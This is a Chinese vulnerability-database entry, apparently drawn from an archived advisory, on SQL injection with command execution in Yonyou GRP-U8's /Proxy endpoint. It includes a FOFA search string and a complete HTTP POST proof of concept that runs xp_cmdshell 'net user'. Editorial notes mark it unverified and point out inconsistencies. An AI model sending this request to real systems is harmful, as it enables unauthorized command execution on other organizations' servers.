---
source: "白阁文库 BaizeSec/bylibrary"
title: "用友GRP-U8 Proxy SQL/命令执行片段"
product: "用友GRP-U8"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "特定版本未给"
prerequisites: "需DB命令能力"
side_effects: "命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%94%A8%E5%8F%8BGRP-u8/%E7%94%A8%E5%8F%8BGRP-U8%E8%A1%8C%E6%94%BF%E4%BA%8B%E4%B8%9A%E5%86%85%E6%8E%A7%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "\\_dork: “用友GRP-u8”"
id: "vw-93ace2ade4dc9fd62080e656"
entity_id: "ve-93ace2ade4dc9fd62080e656"
schema_version: "1"
---

# 用友GRP-U8 Proxy SQL/命令执行片段

## 条目说明

- 对象与具体问题：用友GRP-U8；Proxy SQL/命令执行片段
- 版本、配置及部署条件：特定版本未给
- 认证与权限前提：需DB命令能力
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 已按原文中的具体接口、源码或上下文直接更正产品、根因或修复说明；未知版本和未经证明的影响仍明确保留为待核实。
- 声称输出MD5但实际net user，验证说明错配
- FOFA含_dork转义/曲引号，不是标准字段
- 命令执行条件缺，只有请求无结果，和127同实体

## 操作风险

命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

---
title: '用友GRP-U8行政事业内控管理软件SQL注入漏洞'
date: Mon, 21 Sep 2020 01:22:43 +0000
draft: false
tags: ['白阁-漏洞库']
---

##### 漏洞信息:

用友公司成立于1988年，全面提供具有自主知识产权的企业管理/ERP软件、服务与解决方案，是中国最大的管理软件、ERP软件、集团管理软件、人力资源管理软件、客户关系管理软件及小型企业管理软件提供商。其GRP-U8行政事业内控管理软件特定版本存在SQL注入漏洞，可用于命令执行执行。

##### 漏洞复现:

fofa\_dork: “用友GRP-u8”

###### POC:

```http
POST /Proxy HTTP/1.1
Accept: Accept: */*
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;)
Host: host
Content-Length: 357
Connection: Keep-Alive
Cache-Control: no-cache

cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp_cmdshell 'net user'</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET> 
```

> 请求长度说明：原资料 Content-Length 为 357；保留原始标头；其数值未据实际请求体重新计算或验证。

下列示例使用 MSSQL xp\_cmdshell 执行 net user 命令，并非输出 MD5 的验证；须满足该功能可用和数据库执行权限条件。

##### 修复方案:

联系用友官方获得安全升级方案


---

> 来源：白阁文库 BaizeSec/bylibrary
